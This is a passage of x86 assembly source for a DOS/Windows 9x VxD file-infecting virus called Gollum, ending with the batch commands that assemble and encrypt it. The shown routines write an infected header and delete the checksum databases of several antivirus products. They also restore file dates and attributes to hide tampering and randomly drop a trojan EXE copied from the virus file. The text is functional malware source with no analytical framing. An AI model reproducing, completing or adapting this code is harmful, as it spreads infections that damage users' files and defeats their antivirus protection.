	mov word ptr [esi+12h],"CR"
	;Write new header
	mov ah,40h
	mov cx,Header_Size
	mov edx,esi
	VxDint 21h
	;Delete ANTI-VIR.DAT
	mov esi,OFFSET32 CheckSum_File_00
	call Delete_File
	;Delete CHKLIST.TAV
	mov esi,OFFSET32 CheckSum_File_01
	call Delete_File
	;Delete CHKLIST.MS
	mov esi,OFFSET32 CheckSum_File_02
	call Delete_File
	;Delete AVP.CRC
	mov esi,OFFSET32 CheckSum_File_03
	call Delete_File
	;Delete IVB.NTZ
	mov esi,OFFSET32 CheckSum_File_04
	call Delete_File
Restore_Date_Time:
	mov ax,5701h
	mov cx,word ptr [File_Time]
	mov dx,word ptr [File_Date]
	VxDint 21h
Infect_Close:        
	;Close file
	mov ah,3Eh
	VxDint 21h
Restore_Attr:
	;Restore file attr
	mov ax,4301h
	mov cx,word ptr [File_Attr]
	mov edx,OFFSET32 Infect_FileName
	VxDint 21h
Infect_Error:
	jmp Exit_VxD_Int_21h

;Drop a trojan .EXE file (sometimes)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Drop_Exe_Trojan:
        ;This is our dice
	in ax,40h
	cmp al,0FFh
	jne Bad_OverWrite
	;Open Gollum VxD file
	mov ax,3D00h
	mov edx,OFFSET32 VxD_File_Name
	VxDint 21h
	jc Bad_OverWrite
	;Save file handler
	mov word ptr [Gollum_Handle],ax
	;Create file, abort if exist
	mov ah,5Bh
	xor cx,cx
	mov edx,OFFSET32 Trojan_File_Name
	VxDint 21h
        jc short Bad_OverOpen
	;Save file handler
	mov word ptr [Victim_Handle],ax
Trojanize_Block:
	;Read VxD file block
	mov ah,3Fh
	mov bx,word ptr [Gollum_Handle]
	mov ecx,0200h
	mov edx,OFFSET32 VxD_Buffer
	VxDint 21h
	;Write block        
	xchg ecx,eax
	mov ah,40h
	mov bx,word ptr [Victim_Handle]
	VxDint 21h        
	cmp cx,0200h
	je Trojanize_Block
	;Close trojan file
	mov ah,3Eh
	VxDint 21h
Bad_OverOpen:
	;Close virus VxD file
	mov bx,word ptr [Gollum_Handle]
	mov ah,3Eh
	VxDint 21h
Bad_OverWrite:
	jmp Exit_VxD_Int_21h

;Delete file routines
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Delete_File:
	mov edi,dword ptr [Start_FileName]
Copy_DB_Name:
	cld
	lodsb
	stosb
	or al,al
	jnz Copy_DB_Name
	;Wipe out file attr
	mov ax,4301h
	xor ecx,ecx
	mov edx,OFFSET32 Infect_FileName
	VxDint 21h
	;Delete filename
	mov ah,41h
	VxDint 21h
	ret

;Move file pointer routines (bx = file handle)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Seek_File_Start:
	xor al,al
	jmp SHORT Seek_Int_21h
Seek_File_End:        
	mov al,02h
Seek_Int_21h:
	mov ah,42h
	xor cx,cx
	xor dx,dx
	VxDint 21h
        jc short Seek_Error
	;Return file pointer position into eax
	and eax,0000FFFFh
	shl edx,10h
	add eax,edx
	mov dword ptr [File_Size],eax
	clc
	ret
Seek_Error:
	stc
	ret

EndProc VxD_Int_21h

VxD_LOCKED_CODE_ENDS

	END

; - -[ASSEMBLE.BAT - Batch file used to build GOLLUM.INC] - - - - - - - ->8

tasm gollum
tlink /Tde gollum
exe2bin gollum.exe gollum.bin
crypt
data gollum.crp gollum.inc
